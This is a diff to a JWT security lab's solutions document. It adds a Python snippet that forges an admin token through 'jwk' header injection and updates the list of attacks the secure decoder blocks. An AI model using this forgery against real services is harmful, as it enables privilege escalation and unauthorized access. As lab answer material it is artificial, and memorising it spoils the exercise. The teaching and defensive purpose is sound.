@@ -49,7 +49,20 @@ key_path = KEY_DIR / kid
 
 This allows traversal from `/lab/app/keys` to `/tmp/jwt-lab/attacker.key`.
 
-## Task 4 Reference Solution
+## Task 4 Solution
+
+In `exploits/task4_jwk_injection.py`:
+
+```python
+private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+jwk = json.loads(RSAAlgorithm.to_jwk(private_key.public_key()))
+payload["role"] = "admin"
+print(jwt.encode(payload, private_key, algorithm="RS256", headers={"jwk": jwk, "kid": "task4"}))
+```
+
+The attack works because `vulnerable_task4_decode()` reads the `jwk` header from the token and uses whatever public key it contains to verify the signature. Since the attacker generated both the key pair and the token, the signature always verifies successfully.
+
+## Task 5 Reference Solution
 
 A correct implementation for `student_secure_decode_rs256()` is:
 
@@ -80,10 +93,11 @@ This blocks:
 - `alg:none`, because only `RS256` is accepted;
 - RS256 to HS256 confusion, because `HS256` is rejected before verification;
 - `kid` path traversal, because the key ID must equal `task2` and is never used as a filesystem path;
+- `jwk` header injection, because the key is loaded directly from disk and the `jwk` header is never read;
 - replay of malformed tokens missing issuer or audience, because `jwt.decode()` validates both.
 
 ## Expected Verification
 
 A real admin token from `/fixed/login` should succeed against `/fixed/admin`.
 
-Forged tokens from Tasks 1, 2, and 3 should fail against `/fixed/admin` with HTTP `401`.
+Forged tokens from Tasks 1, 2, 3, and 4 should fail against `/fixed/admin` with HTTP `401`.
